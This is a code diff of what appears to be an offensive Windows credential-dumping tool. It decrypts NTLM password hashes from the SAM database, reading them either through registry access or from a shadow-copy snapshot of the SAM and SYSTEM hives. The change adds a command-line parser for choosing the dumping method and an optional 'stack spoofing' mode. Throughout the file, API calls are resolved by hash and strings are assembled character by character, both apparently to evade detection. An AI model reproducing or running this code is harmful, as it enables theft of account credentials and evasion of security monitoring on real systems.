@@ -8,10 +8,6 @@
 
 #include <Windows.h>
 #include <winternl.h>
-//#include <BaseTsd.h>
-//#include <ntstatus.h>
-//#include <comdef.h>
-//#include <string.h>
 
 #include "include/main.h"
 #include "include/proxyNtCalls.h"
@@ -64,7 +60,7 @@ FARPROC myGetProcAddress(DWORD moduleHash, DWORD exportHash) {
 		WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllPath, dllNameLength, NULL, NULL);
 		CharUpperA(dllPath);
 
-		CHAR * last = strrchr(dllPath, '\\');
+		CHAR* last = strrchr(dllPath, '\\');
 		last++;
 		if (HashString2A(last) == moduleHash)
 		{
@@ -264,14 +260,14 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 
 	ULONG lenRet = nEntries * sizeof(SAM);
 	CopyMemory(size, &lenRet, sizeof(ULONG));
-	
+
 	if (samRegEntries != NULL) {
-		for (int i = 0; i < nEntries; i++) {			
+		for (int i = 0; i < nEntries; i++) {
 			samRegEntries[i] = sams[i];
 			//HeapFree(GetProcessHeap(), 0, sams[i]);
 		}
 	}
-	
+
 	return;
 }
 
@@ -279,7 +275,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 void decryptSAM(PSAM samRegEntries[], int entries) {
 	CHAR strMagic1[] = { '!','@','#','$','%','^','&','*','(',')','q','w','e','r','t','y','U','I','O','P','A','z','x','c','v','b','n','m','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q',')','(','*','@','&','%', '\0' };
 	CHAR strMagic2[] = { '0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9', '\0' };
-	CHAR strMagic3[] = { 'N','T','P','A','S','S','W','O','R','D', '\0'};
+	CHAR strMagic3[] = { 'N','T','P','A','S','S','W','O','R','D', '\0' };
 
 	for (int i = 0; i < entries; i++) {
 		LONG offset = 0;
@@ -297,7 +293,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		BYTE bootKey[16];
 		getBootKey(samRegEntries[i], bootKey);
 
-		BYTE encNTLMrecovered[16] = {};		
+		BYTE encNTLMrecovered[16] = {};
 
 		if (samRegEntries[i]->v[0xAC] == 0x38) {
 			BYTE encSyskey[16] = {};
@@ -308,7 +304,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 			CBC_Mode< AES >::Decryption d;
 			d.SetKeyWithIV(bootKey, 16, encSyskeyIV, 16);
-			
+
 			BYTE sysKey[16] = {};
 			ArraySink rs(sysKey, 16);
 			ArraySource s(encSyskey, 16, true,
@@ -326,7 +322,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 			CBC_Mode< AES >::Decryption d2;
 			d2.SetKeyWithIV(sysKey, 16, encNTLMIV, 16);
-			
+
 			ArraySink rs2(encNTLMrecovered, 16);
 			ArraySource s2(encNTLM, 16, true,
 				new StreamTransformationFilter(d2,
@@ -480,7 +476,7 @@ void getClasses(PSAM samRegEntry) {
 
 	PWCHAR sAll[4] = { sJD, sSkew1, sGBG, sData };
 
-	WCHAR Reg[] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\\', L'\0'};
+	WCHAR Reg[] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\\', L'\0' };
 
 	WCHAR resul[MAX_KEY_VALUE_LENGTH] = L"\0";
 
@@ -616,7 +612,7 @@ DWORD HashString2A(LPCSTR String)
 }
 
 int main(int argc, char** argv) {
-	#ifdef PROXY_NT_CALLS
+#ifdef PROXY_NT_CALLS
 
 	pMyNtOpenKey = proxyNtOpenKey;
 	pMyNtQueryKey = proxyNtQueryKey;
@@ -626,8 +622,8 @@ int main(int argc, char** argv) {
 	pMyNtClose = proxyNtCloseKey;
 	pMyRtlInitUnicodeString = proxyRtlInitUnicodeString;
 
-	#endif // PROXY_NT_CALLS
-	#ifndef PROXY_NT_CALLS
+#endif // PROXY_NT_CALLS
+#ifndef PROXY_NT_CALLS
 
 	FARPROC auxPMyNtOpenKey = myGetProcAddress(ntdlldll_RFDT, NtOpenKey_RFDT);
 	FARPROC auxPMyNtQueryKey = myGetProcAddress(ntdlldll_RFDT, NtQueryKey_RFDT);
@@ -635,7 +631,7 @@ int main(int argc, char** argv) {
 	FARPROC auxPMyNtQueryValueKey = myGetProcAddress(ntdlldll_RFDT, NtQueryValueKey_RFDT);
 	FARPROC auxPMyNtEnumerateValueKey = myGetProcAddress(ntdlldll_RFDT, NtEnumerateValueKey_RFDT);
 	FARPROC auxPMyNtClose = myGetProcAddress(ntdlldll_RFDT, NtClose_RFDT);
-	FARPROC auxPMyRtlInitUnicodeString = myGetProcAddress(ntdlldll_RFDT, rtlini);
+	FARPROC auxPMyRtlInitUnicodeString = myGetProcAddress(ntdlldll_RFDT, RtlInitUnicodeString_RFDT);
 
 	pMyNtOpenKey = (myNtOpenKey)auxPMyNtOpenKey;
 	pMyNtQueryKey = (myNtQueryKey)auxPMyNtQueryKey;
@@ -644,29 +640,113 @@ int main(int argc, char** argv) {
 	pMyNtEnumerateValueKey = (myNtEnumerateValueKey)auxPMyNtEnumerateValueKey;
 	pMyNtClose = myNtClose(auxPMyNtClose);
 	pMyRtlInitUnicodeString = (myRtlInitUnicodeString)auxPMyRtlInitUnicodeString;
-	
-	#endif // !PROXY_NT_CALLS
 
-	// Time to debug as always works at first :D
-	// 
-	ULONG size;
-	//getSAM(NULL, &size);
+#endif // !PROXY_NT_CALLS
 
-	// Array of PSAM
-	PSAM sam[MAX_SAM_ENTRIES] = {};
+	BOOL useShadowSnapshotFlag = FALSE;
+	BOOL useRegistryFlag = FALSE;
+	BOOL debugFlag = FALSE;
+	BOOL proxyNTCallsFlag = FALSE;
 
-	//getSAM(sam, &size);
+	CHAR helpOptionShort[] = "-h";
+	CHAR helpOptionLong[] = "--help";
+	CHAR ssOptionShort[] = "-ss";
+	CHAR ssOptionLong[] = "--shadowSnapshot";
+	CHAR registryOptionShort[] = "-r";
+	CHAR registryOptionLong[] = "--registry";
+	CHAR debugOptionShort[] = "-d";
+	CHAR debugOptionLong[] = "--debug";
+	CHAR stackSpoofOptionShort[] = "-cc";
+	CHAR stackSpoofOptionLong[] = "--customCallback";
 
-	//decryptSAM(sam, size/sizeof(SAM));
+	if (argc == 1) {
+		printf("Usage: %s [options]\n", argv[0]);
+		printf("Options:\n");
+		printf("  %s, %s  Show this help message\n", helpOptionShort, helpOptionLong);
+		printf("  %s, %s\tUse shadow snapshot method\n", ssOptionShort, ssOptionLong);
+		printf("  %s, %s\t\tUse registry method\n", registryOptionShort, registryOptionLong);
+		printf("  %s, %s\t\tEnable debug mode\n", debugOptionShort, debugOptionLong);
+		printf("  %s, %s\tUse custom callback mechanism (Stack Spoofing)\n", stackSpoofOptionShort, stackSpoofOptionLong);
+	}
 
-	//HeapFree(GetProcessHeap(), 0, sam);
+	for (int i = 1; i < argc; i++) {
+		PCHAR currentArg = argv[i];
 
-	WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)];
-	WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)];
-	createSS(sourcePathFileSAM, sourcePathFileSYSTEM);
+		if (strncmp(currentArg, helpOptionShort, strlen(helpOptionShort)) == 0 || strncmp(currentArg, helpOptionLong, strlen(helpOptionLong)) == 0) {
+			printf("Usage: %s [options]\n", argv[0]);
+			printf("Options:\n");
+			printf("  %s, %s  Show this help message\n", helpOptionShort, helpOptionLong);
+			printf("  %s, %s\tUse shadow snapshot method\n", ssOptionShort, ssOptionLong);
+			printf("  %s, %s\t\tUse registry method\n", registryOptionShort, registryOptionLong);
+			printf("  %s, %s\t\tEnable debug mode\n", debugOptionShort, debugOptionLong);
+			printf("  %s, %s\tUse custom callback mechanism (Stack Spoofing)\n", stackSpoofOptionShort, stackSpoofOptionLong);
+		}
+		else if (strncmp(currentArg, ssOptionShort, strlen(ssOptionShort)) == 0 || strncmp(currentArg, ssOptionLong, strlen(ssOptionLong)) == 0) {
+			useShadowSnapshotFlag = TRUE;
+		}
+		else if (strncmp(currentArg, registryOptionShort, strlen(registryOptionShort)) == 0 || strncmp(currentArg, registryOptionLong, strlen(registryOptionLong)) == 0) {
+			useRegistryFlag = TRUE;
+		}
+		else if (strncmp(currentArg, debugOptionShort, strlen(debugOptionShort)) == 0 || strncmp(currentArg, debugOptionLong, strlen(debugOptionLong)) == 0) {
+			debugFlag = TRUE;
+		}
+		else if (strncmp(currentArg, stackSpoofOptionShort, strlen(stackSpoofOptionShort)) == 0 || strncmp(currentArg, stackSpoofOptionLong, strlen(stackSpoofOptionLong)) == 0) {
+			proxyNTCallsFlag = TRUE;
+		}
+	}
 
-	getSAMfromRegf(NULL, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
-	getSAMfromRegf(sam, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+	if (proxyNTCallsFlag) {
+		pMyNtOpenKey = proxyNtOpenKey;
+		pMyNtQueryKey = proxyNtQueryKey;
+		pMyNtEnumerateKey = proxyNtEnumerateKey;
+		pMyNtQueryValueKey = proxyNtQueryValueKey;
+		pMyNtEnumerateValueKey = proxyNtEnumerateValueKey;
+		pMyNtClose = proxyNtCloseKey;
+		pMyRtlInitUnicodeString = proxyRtlInitUnicodeString;
+	}
+	else {
+		FARPROC auxPMyNtOpenKey = myGetProcAddress(ntdlldll_RFDT, NtOpenKey_RFDT);
+		FARPROC auxPMyNtQueryKey = myGetProcAddress(ntdlldll_RFDT, NtQueryKey_RFDT);
+		FARPROC auxPMyNtEnumerateKey = myGetProcAddress(ntdlldll_RFDT, NtEnumerateKey_RFDT);
+		FARPROC auxPMyNtQueryValueKey = myGetProcAddress(ntdlldll_RFDT, NtQueryValueKey_RFDT);
+		FARPROC auxPMyNtEnumerateValueKey = myGetProcAddress(ntdlldll_RFDT, NtEnumerateValueKey_RFDT);
+		FARPROC auxPMyNtClose = myGetProcAddress(ntdlldll_RFDT, NtClose_RFDT);
+		FARPROC auxPMyRtlInitUnicodeString = myGetProcAddress(ntdlldll_RFDT, RtlInitUnicodeString_RFDT);
 
-	decryptSAM(sam, size / sizeof(SAM));
+		pMyNtOpenKey = (myNtOpenKey)auxPMyNtOpenKey;
+		pMyNtQueryKey = (myNtQueryKey)auxPMyNtQueryKey;
+		pMyNtEnumerateKey = (myNtEnumerateKey)auxPMyNtEnumerateKey;
+		pMyNtQueryValueKey = (myNtQueryValueKey)auxPMyNtQueryValueKey;
+		pMyNtEnumerateValueKey = (myNtEnumerateValueKey)auxPMyNtEnumerateValueKey;
+		pMyNtClose = myNtClose(auxPMyNtClose);
+		pMyRtlInitUnicodeString = (myRtlInitUnicodeString)auxPMyRtlInitUnicodeString;
+	}
+
+
+	if (useRegistryFlag) {
+		ULONG size;
+		PSAM sam[MAX_SAM_ENTRIES] = {};
+
+		getSAM(NULL, &size);
+
+		getSAM(sam, &size);
+
+		decryptSAM(sam, size / sizeof(SAM));
+	}
+
+	if (useShadowSnapshotFlag) {
+		ULONG size;
+		PSAM sam[MAX_SAM_ENTRIES] = {};
+
+		WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)];
+		WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)];
+		createSS(sourcePathFileSAM, sourcePathFileSYSTEM);
+
+		getSAMfromRegf(NULL, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+		getSAMfromRegf(sam, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+
+		decryptSAM(sam, size / sizeof(SAM));
+	}
+
+	// Debug option TODO
 }
